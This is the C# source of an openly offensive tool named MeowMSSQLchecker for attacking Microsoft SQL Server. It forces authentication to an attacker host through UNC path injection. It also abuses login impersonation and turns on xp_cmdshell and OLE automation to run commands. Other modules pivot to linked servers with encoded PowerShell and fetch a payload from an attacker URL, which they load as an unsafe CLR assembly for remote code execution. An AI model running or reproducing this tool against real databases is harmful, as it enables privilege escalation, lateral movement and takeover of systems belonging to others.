using System;
using System.Text;
using System.Net;
using System.Data.SqlClient;
using System.Collections.Generic;

namespace MeowMSSQLchecker
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage : MeowMSSQLchecker.exe Module");
                Console.WriteLine("Module :");
                Console.WriteLine("    1  TARGET_HOST          Check Current User Groups.");
                Console.WriteLine("    2  TARGET_HOST  LHOST   UNC Path Injection.");
                Console.WriteLine("    3  TARGET_HOST          Find Impersonate User.");
                Console.WriteLine("    4  TARGET_HOST          Try to Impersonate \"dbo\".");
                Console.WriteLine("    5  TARGET_HOST  USER    Try to Impersonate User.");
                Console.WriteLine("    6  TARGET_HOST          Enumeration All Linked SQL Server.");
                Console.WriteLine("    7  TARGET_HOST  SERVER  Remote Code Execution at Linked Server.");
                Console.WriteLine("    8  TARGET_HOST  SERVER  Check Remote to Local Permission");
                Console.WriteLine("    9  TARGET_HOST  SERVER  Command Execute from Remote Server");
                return;
            }

            int mode = Convert.ToInt32(args[0]);
            string LHOST = "";
            string CMD = "";
            string USER = "";
            string SERVER = "";
            string sqlServer = args[1];

            if (mode == 2 & args.Length == 2)
            {
                Console.WriteLine("[!] Missing params : LHOST");
                return;
            }
            else if (mode == 2 & args.Length == 3) {
                LHOST = args[2];
            }

            if (mode == 5 & args.Length == 2)
            {
                Console.WriteLine("[!] Missing params : USER");
                return;
            }
            else if (mode == 5 & args.Length == 3)
            {
                USER = args[2];
            }

            if (mode == 7 | mode == 8 | mode == 9 & args.Length == 2)
            {
                Console.WriteLine("[!] Missing params : SERVER");
                return;
            }
            else if (mode == 7 | mode == 8 | mode == 9 & args.Length == 3)
            {
                SERVER = args[2];
            }

            Console.WriteLine(SERVER);

            string database = "master";
            string conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True";
            SqlConnection con = new SqlConnection(conString);

            Console.WriteLine("[+] Try to connect to MSSQL Server");
            try
            {
                con.Open();
                Console.WriteLine("[+] Successful Auth");
            }
            catch (Exception)
            {
                Console.WriteLine("[!] Failed to auth");
                Environment.Exit(1);
            }

            SQL_query("SELECT SYSTEM_USER;", 0, con);
            SQL_query("SELECT USER_NAME();", 4, con);

            switch (mode)
            {
                case 1:
                    Console.WriteLine("[+] Module : Checker");
                    Console.Write("[+] Member of public : ");
                    if (SQL_query("SELECT IS_SRVROLEMEMBER('public');", 1, con))
                    {
                        Console.WriteLine("Yes");
                    }
                    else
                    {
                        Console.WriteLine("No");
                    }

                    Console.Write("[+] Member of sysadmin : ");
                    if (SQL_query("SELECT IS_SRVROLEMEMBER('sysadmin');", 1, con))
                    {
                        Console.WriteLine("Yes");
                    }
                    else
                    {
                        Console.WriteLine("No");
                    }
                    break;
                case 2:
                    Console.WriteLine("[+] Module : UNC Path Injection");
                    try
                    {
                        SQL_query("EXEC master..xp_dirtree \"\\\\" + LHOST + "\\\\meow\";", 2, con);
                    }
                    catch
                    {
                        Console.WriteLine("[+] Done.");
                    }
                    break;
                case 3:
                    Console.WriteLine("[+] Module : List All Impersonate User");
                    SQL_query("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';", 3, con);
                    break;
                case 4:
                    Console.WriteLine("[+] Module : Impersonate dbo");
                    Console.WriteLine("[+] Try to impersonate \"dbo\"");
                    SQL_query("use msdb; EXECUTE AS USER = 'dbo';", 2, con);
                    if (SQL_query("SELECT IS_SRVROLEMEMBER('sysadmin');", 1, con))
                    {
                        Console.WriteLine("[+] Successful impersonate to dbo");
                    }
                    else
                    {
                        Console.WriteLine("[!] Fail to impersonate to dbo");
                        return;
                    }
                    SQL_query("SELECT SYSTEM_USER;", 0, con);
                    remote_code_execution(con);
                    break;
                case 5:
                    Console.WriteLine("[+] Module : Impersonate User");
                    Console.WriteLine("[+] Try to impersonate \"" + USER + "\"");
                    SQL_query("EXECUTE AS LOGIN = '" + USER + "';", 2, con);
                    SQL_query("SELECT SYSTEM_USER;", 0, con);
                    remote_code_execution(con);
                    break;
                case 6:
                    Console.WriteLine("[+] Module : List All Linked Servers");
                    SQL_query("EXEC sp_linkedservers;", 6, con);
                    break;
                case 7:
                    Console.WriteLine("[+] Module : Remote Code Execution at Linked Server");
                    Console.WriteLine("[+] Enable xp_cmdshell");
                    SQL_query("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT " + SERVER, 2, con);
                    SQL_query("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT " + SERVER, 2, con);
                    while (true)
                    {
                        Console.Write("[?] Powershell Command : ");
                        CMD = Console.ReadLine();
                        if (CMD == "exit")
                        {
                            break;
                        }
                        CMD = Convert.ToBase64String(Encoding.Unicode.GetBytes(CMD));
                        Console.WriteLine("[+] Command Result :");
                        SQL_query("EXEC ('xp_cmdshell ''powershell -enc " + CMD + "''') AT " + SERVER, 5, con);
                    }
                    break;
                case 8:
                    Console.WriteLine("[+] Module : Check Remote to Local Permission");
                    Console.Write("[+] " + SERVER + " to " + sqlServer + " Permission is : ");
                    SQL_query("select mylogin from openquery(\"" + SERVER + "\", 'select mylogin from openquery(\"" + sqlServer + "\", ''select SYSTEM_USER as mylogin'')')", 7, con);
                    Console.WriteLine();
                    break;
                case 9:
                    Console.WriteLine("[+] Module : Command Execute from Remote Server");
                    Console.WriteLine("[+] Enable xp_cmdshell");
                    SQL_query("EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT " + sqlServer + "') AT " + SERVER, 2, con);
                    SQL_query("EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT " + sqlServer + "') AT " + SERVER, 2, con);
                    while (true)
                    {
                        Console.Write("[?] Powershell Command : ");
                        CMD = Console.ReadLine();
                        if (CMD == "exit")
                        {
                            break;
                        }
                        CMD = Convert.ToBase64String(Encoding.Unicode.GetBytes(CMD));
                        Console.WriteLine("[+] Command Result :");
                        SQL_query("EXEC ('EXEC (''xp_cmdshell ''''powershell -enc " + CMD + "'''''') AT " + sqlServer + "') AT " + SERVER, 5, con);
                    }
                    break;
            }
            con.Close();
        }

        static void remote_code_execution(SqlConnection con)
        {
            int module;
            string CMD;
            while (true)
            {
                Console.WriteLine("[+] Modules :");
                Console.WriteLine("      1  Remote Code Execution - xp_cmdshell");
                Console.WriteLine("      2  Remote Code Execution - OLE");
                Console.WriteLine("      3  Remote Code Execution - Custom Assemblies");
                Console.Write("[?] Choose module :");
                module = Convert.ToInt32(Console.ReadLine());
                switch (module){
                    case 1:
                        Console.WriteLine("[+] Module : Remote Code Execution - xp_cmdshell");
                        Console.WriteLine("[+] Reconfigure xp_cmdshell");
                        SQL_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", 2, con);
                        while (true)
                        {
                            Console.WriteLine("[!] WARNING DON'T USE THIS CHAR : \"");
                            Console.Write("[?] Command : ");
                            CMD = Console.ReadLine();
                            if (CMD == "exit")
                            {
                                break;
                            }
                            Console.WriteLine("[+] Command Result :");
                            SQL_query("EXEC xp_cmdshell \"" + CMD + "\"", 5, con);
                        }
                        break;
                    case 2:
                        Console.WriteLine("[+] Module : Remote Code Execution - OLE");
                        Console.WriteLine("[+] Enable OLE");
                        SQL_query("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", 2, con);
                        while (true)
                        {
                            Console.WriteLine("[!] WARNING DON'T USE THIS CHAR : '");
                            Console.Write("[?] Command : ");
                            CMD = Console.ReadLine();
                            if (CMD == "exit")
                            {
                                break;
                            }
                            Console.WriteLine("[+] Command Result :");
                            SQL_query("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"" + CMD + "\"'", 2, con);
                        }
                        break;
                    case 3:
                        string url;
                        string payload;
                        Console.WriteLine("[+] Module : Remote Code Execution - Custom Assemblies");
                        Console.Write("[?] Payload URL : ");
                        url = Console.ReadLine();
                        Console.WriteLine("[+] Disable CLR strict security");
                        SQL_query ("use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;", 2, con);
                        Console.WriteLine("[+] Get payload from attacker");
                        WebClient web = new WebClient();
                        try
                        {
                            payload = web.DownloadString(url);
                        }
                        catch
                        {
                            payload = "";
                            Console.WriteLine("[!] Cannot Connect to Attacker");
                            Environment.Exit(1);
                        }
                        Console.WriteLine("[+] Create assembly");
                        try
                        {
                            SQL_query("CREATE ASSEMBLY rce_assembly FROM 0x" + payload + " WITH PERMISSION_SET = UNSAFE;", 2, con);
                        }
                        catch
                        {
                            SQL_query("DROP PROCEDURE [dbo].[rce];", 2, con);
                            SQL_query("DROP ASSEMBLY rce_assembly;", 2, con);
                            SQL_query("CREATE ASSEMBLY rce_assembly FROM 0x" + payload + " WITH PERMISSION_SET = UNSAFE;", 2, con);
                        }
                        
                        Console.WriteLine("[+] Create procedure");
                        SQL_query("CREATE PROCEDURE [dbo].[rce] @cmd NVARCHAR (4000) AS EXTERNAL NAME [rce_assembly].[StoredProcedures].[rce];", 2, con);
                        
                        while (true)
                        {
                            Console.WriteLine("[!] WARNING DON'T USE THIS CHAR : '");
                            Console.Write("[?] Command : ");
                            CMD = Console.ReadLine();
                            if (CMD == "exit")
                            {
                                break;
                            }
                            Console.WriteLine("[+] Command Result :");
                            SQL_query("EXEC rce '" + CMD + "'", 5, con);
                        }
                        Console.WriteLine("[+] Clearn up");
                        SQL_query("DROP PROCEDURE [dbo].[rce];", 2, con);
                        SQL_query("DROP ASSEMBLY rce_assembly;", 2, con);
                        break;
                }
            }
        }

        static bool SQL_query(string cmd, int mode, SqlConnection con)
        {
            bool result;
            SqlCommand command = new SqlCommand(cmd, con);
            SqlDataReader reader = command.ExecuteReader();
            switch (mode)
            {
                case 0:
                    reader.Read();
                    Console.WriteLine("[+] Logged in as : " + reader[0]);
                    result = true;
                    reader.Close();
                    break;
                case 1:
                    reader.Read();
                    Int32 role = Int32.Parse(reader[0].ToString());
                    result = (role == 1);
                    reader.Close();
                    break;
                case 2:
                    result = true;
                    reader.Close();
                    break;
                case 3:
                    while(reader.Read())
                    {
                        Console.WriteLine("[+] User can be Impersonate : " + reader[0]);
                    }
                    result = true;
                    reader.Close();
                    break;
                case 4:
                    reader.Read();
                    Console.WriteLine("[+] Database Privilege : " + reader[0]);
                    result = true;
                    reader.Close();
                    break;
                case 5:
                    while (reader.Read())
                    {
                        Console.WriteLine(reader[0]);
                    }
                    result = true;
                    reader.Close();
                    break;
                case 6:
                    List<string> machines = new List<string>();
                    result = true;
                    while (reader.Read())
                    {
                        if (reader[0].ToString().Contains("\\")){
                            machines.Add(reader[0].ToString().Split('\\')[0]);
                        }
                        else
                        {
                            machines.Add(reader[0].ToString());
                        }
                    }
                    reader.Close();
                    for (int i = 0; i < machines.Count; i++)
                    {
                        Console.Write("[+] Linked SQL Server : " + machines[i]);
                        Console.Write(":");
                        try
                        {
                            SQL_query("select myuser from openquery(\"" + machines[i] + "\", 'SELECT SYSTEM_USER as myuser')", 7, con);
                        }
                        catch
                        {
                            Console.Write(" Empty ");
                        }
                        Console.Write(":");
                        try
                        {
                            SQL_query("select version from openquery(\"" + machines[i] + "\", 'select @@version as version')", 8, con);
                        }
                        catch
                        {
                            Console.WriteLine(" Empty ");
                        }
                    }
                    break;
                case 7:
                    result = true;
                    while (reader.Read())
                    {
                        Console.Write(reader[0]);
                        break;
                    }
                    reader.Close();
                    break;
                case 8:
                    result = true;
                    string input = "";
                    while (reader.Read())
                    {
                        input = reader[0].ToString();
                        break;
                    }
                    string[] final_result = input.Split('\n');
                    Console.WriteLine(final_result[0]);
                    reader.Close();
                    break;
                default: 
                    result = true;
                    reader.Close();
                    break;
            }
            return result;
        }

    }

}
